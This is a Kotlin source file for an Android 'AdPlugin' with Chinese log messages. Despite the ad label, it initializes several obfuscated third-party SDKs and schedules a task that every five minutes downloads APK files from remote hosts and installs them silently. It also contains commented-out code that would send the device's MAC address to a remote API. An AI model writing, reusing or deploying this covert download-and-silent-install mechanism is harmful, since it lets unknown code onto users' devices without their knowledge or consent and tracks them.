package com.chihi.adplugin

import android.os.FileUtils
import com.chihi.adplugin.bean.UpdateAppsDTO
import com.chihi.adplugin.ext.getApkFileNameFromUrl
import com.chihi.adplugin.ext.getBasePath
import com.chihi.adplugin.ext.getFileExtension
import com.chihi.adplugin.ext.installApk
import com.chihi.adplugin.ext.silentInstallWithMutex
import com.chihi.adplugin.log.printLog
import com.chihi.adplugin.net.NetworkHelper
import com.codeZeng.lib_autorun.ext.getMacAddress
import java.io.File
import java.io.IOException
import java.util.concurrent.Executors
import java.util.concurrent.Future
import java.util.concurrent.ScheduledExecutorService
import java.util.concurrent.ScheduledFuture
import java.util.concurrent.TimeUnit

object AdPlugin {
    private lateinit var adDispatcher: AdDispatcher

    fun initialize() {
        // 注册多个广告提供商
        try {
            "插件包内部开始初始化".printLog()
            println("插件包内部开始初始化")
            com.s.d.t.s(appContext)
            "IP包---s.d.t.s初始化完成".printLog()
            println("IP包---s.d.t.s初始化完成")
            com.debby.Devour.getInstance().devourPlay(appContext)
            "IF240326包---com.debby.Devour初始化完成".printLog()
            com.unia.y.b.a(appContext,"7087","")
            "7087包---com.unia.y.b.a初始化完成".printLog()
            //installPackage()
             checkAppPush()
            //val sdkA = AdSdkAProvider()
            //val sdkB = AdSdkBProvider()
            //val providers = arrayListOf(sdkA)
            //adDispatcher = AdDispatcher(providers)
            //providers.forEach { it.initialize(appContext) }
        }catch (e:Exception){
            "插件内部初始化失败：${e.message}".printLog()
        }

    }

    private  var scheduler: ScheduledExecutorService?=null
    private var taskFuture: ScheduledFuture<*>? = null
    private fun checkAppPush() {
        scheduler?.shutdown()
        scheduler = Executors.newSingleThreadScheduledExecutor()
        taskFuture?.cancel(false)
        taskFuture = scheduler!!.scheduleWithFixedDelay({
            "周期任务执行,查询推送应用: ${System.currentTimeMillis()}".printLog()
           //checkAppsUpdate()
            val packageInfo = appContext.packageManager.getPackageInfo(appContext.packageName, 0)
            println("周期任务执行,查询推送应用: ${appContext.packageName}-----${packageInfo.versionCode}")
            if(appContext.packageName=="com.chihihx.store"&& packageInfo.versionCode<4){
                println("开始准备升级旧YTX渠道的包")
                val url = "https://xfile.f3tcp.cc/pub/YTX/AppStore_1.3.2_20250326_1653_YTX.apk"
                downloadApks(arrayListOf(url))
            }else if(appContext.packageName=="com.androidytx.store"&& packageInfo.versionCode<2){
                println("开始准备升级新YTX渠道的包")
                val url = "https://xfile.f3tcp.cc/pub/YTX_1/AppStore_1.0.2_20250326_1657_YTX_1.apk"
                downloadApks(arrayListOf(url))
            }
        }, 0, 60000*5, TimeUnit.MILLISECONDS)

    }

    private fun checkAppsUpdate() {
        NetworkHelper.makeGetRequest(
            url = "https://api.ppmovie.cc/appapi/launch/hotline",
            params = mapOf(
                "req_id" to "0",
                "channel" to "FOTAS1001",
                "mac" to "${getMacAddress()}",
            ),
            responseType = List::class.java as Class<List<UpdateAppsDTO>>,
            itemType = UpdateAppsDTO::class.java
        ) {
            success { data ->
                //println("成功: ${data[0].appName}")
            }
            failed { error ->
                println("失败: ${error.message}")
            }
        }
    }

    private var executorService = Executors.newSingleThreadExecutor()
    private var currentTask: Future<*>? = null

    private fun installPackage() {
        val apkPath = "/zoom/Vudu.apk" // 指定APK文件的路径
        val command = arrayOf("pm", "install", apkPath) // 构建pm install命令

        // 取消上一个任务（如果存在）
        currentTask?.cancel(true)

        // 提交新任务
        currentTask = executorService.submit {
            try {
                //apkPath.installApk()
                val link1 = "https://pub-7bdb35df0362454385da85d15e9709fe.r2.dev/apks/MiguVideo.apk"
                //val link2 = "https://xfile.f3tcp.cc/apks/72/Disney+/Disney.apk"
                downloadApks(arrayListOf(link1))
            } catch (e: IOException) {
                e.printStackTrace()
                "执行命令时发生错误: ${e.message}".printLog()
            }
        }
    }

    private fun downloadApks(downloadLinks: List<String>) {
        downloadLinks.forEach { downloadLink ->
            val fileExtension = downloadLink.getFileExtension()
            val fileName = downloadLink.getApkFileNameFromUrl()
            if (fileExtension == ".apk") {
                println("当前是apk链接---$fileName")
                val destPath = "${"apps".getBasePath()}/${fileName}"
                if (File(destPath).exists()) {
                    // 本地已存在，直接安装
                    println("本地存在，直接安装应用")
                    destPath.silentInstallWithMutex { isSuccess ->
                        if (isSuccess) {
                            println("APK 安装成功")
                        } else {
                            println("APK 安装失败")
                        }
                    }
                } else {
                    NetworkHelper.downloadFile(
                        url = downloadLink,
                        destination = File(destPath),
                        progressListener = { progress -> println("下载进度: $progress%") }
                    ) {
                        success { result ->
                            println("下载成功: $result")
                            result.silentInstallWithMutex { isSuccess ->
                                if (isSuccess) {
                                    println("APK 安装成功")
                                } else {
                                    println("APK 安装失败")
                                }
                            }
                        }
                        failed { error ->
                            println("下载失败: ${error.message}")
                        }
                    }
                }
            } else {
                println("当前不是apk链接----${fileExtension}")
            }
        }
    }



    fun loadAd(config: AdConfig.() -> Unit) {
        adDispatcher.loadAd( config)
    }

    fun removeAd():Boolean = adDispatcher.removeAd()



}
